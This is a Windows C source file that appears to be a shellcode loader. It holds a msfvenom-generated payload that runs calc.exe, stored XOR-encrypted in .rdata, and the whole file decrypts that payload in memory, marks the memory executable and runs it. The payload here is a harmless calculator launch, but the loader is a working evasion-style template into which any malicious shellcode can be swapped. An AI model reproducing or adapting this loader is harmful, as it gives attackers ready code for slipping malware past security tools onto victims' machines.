#include <Windows.h>
#include <stdio.h>

// msfvenom.bat -p windows/x64/exec CMD=calc.exe -f c
// encrypted with CyberChef XOR, To Hex
// payload saved to .rdata
BYTE encrypted_payload[] = "\x57\x85\x6c\x4f\x3d\x07\x6b\xcd\xef\xab\x8c\xbe\xea\x9d\xbd"
"\xfa\x9b\xa7\x9a\x1f\x8a\xe3\x46\xbd\xcb\x85\x64\xf9\xd5\xa7\x20\x9f\xcf\xe3\x46\x9d\xfb"
"\x85\xe0\x1c\x87\xa5\xe6\xfc\x26\xe3\xfc\x2f\x07\xf1\x8e\xd7\xcf\xc3\x8b\x8c\x2e\x62\xc0"
"\xae\xaa\x0c\x0d\x46\x9f\xae\xfa\x85\x64\xf9\xed\x64\xe9\xf1\xa7\xaa\x1d\x64\x2b\x45\xef"
"\xab\xcd\xa7\x2e\x0d\x9b\xcc\x85\xee\x7b\x9d\x64\xe3\xd5\xab\x20\x8d\xcf\xe2\xcc\x3f\x48"
"\x9b\xa7\x54\x04\xae\x20\xf9\x67\xe3\xcc\x39\xe6\xfc\x26\xe3\xfc\x2f\x07\x8c\x2e\x62\xc0"
"\xae\xaa\x0c\xd7\x4b\xb8\x1e\xe7\xce\xa3\x8f\xc5\xaa\x92\x1c\x9a\x73\x95\xab\x20\x8d\xcb"
"\xe2\xcc\x3f\xcd\x8c\x64\xa7\x85\xab\x20\x8d\xf3\xe2\xcc\x3f\xea\x46\xeb\x23\x85\xee\x7b"
"\x8c\xb7\xea\x95\xb1\xf2\x97\xae\xf3\x8c\xb6\xea\x97\xa7\x28\x21\xcf\xea\x9f\x10\x4b\x95"
"\xae\xf2\x97\xa7\x20\xdf\x06\xfc\x32\x10\x54\x90\xa7\x11\xcc\xef\xab\xcd\xef\xab\xcd\xef"
"\xe3\x40\x62\xaa\xcc\xef\xab\x8c\x55\x9a\x46\x80\x2c\x32\x3a\x10\x3d\x5a\x09\x9b\xae\x11"
"\x6b\x7a\x16\x50\x10\x7e\x85\x6c\x6f\xe5\xd3\xad\xb1\xe5\x2b\x36\x0f\xde\xc8\x54\xec\xde"
"\x9d\xc4\xa7\xef\xf2\x8c\x66\x71\x32\x3a\xc8\xac\x83\xc8\xe3\x8a\xd3\xa8\xef";

BYTE key[] = {0xab, 0xcd, 0xef};

typedef VOID PAYLOAD(VOID);

INT main(VOID)
{
    PBYTE payload_buff = VirtualAlloc(NULL, sizeof(encrypted_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (payload_buff == NULL) {
		printf("VirtualAlloc failed with error code 0x%lx\n", GetLastError());
		return -1;
	}

    CopyMemory(payload_buff, (PVOID)encrypted_payload, sizeof(encrypted_payload));

    for (DWORD i = 0, k = 0; i < sizeof(encrypted_payload); i++, k++) {
        if (k >= sizeof(key)) {
            k = 0;
        }
        payload_buff[i] =  payload_buff[i] ^ key[k];
    }

    DWORD old_protections;

    if ( !VirtualProtect((PVOID)payload_buff, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &old_protections) ) {
        puts("failed to change memory protection");
        return -2;
    }

    PAYLOAD* fn_payload = (PAYLOAD*)payload_buff;

    fn_payload();

    return 0;
}
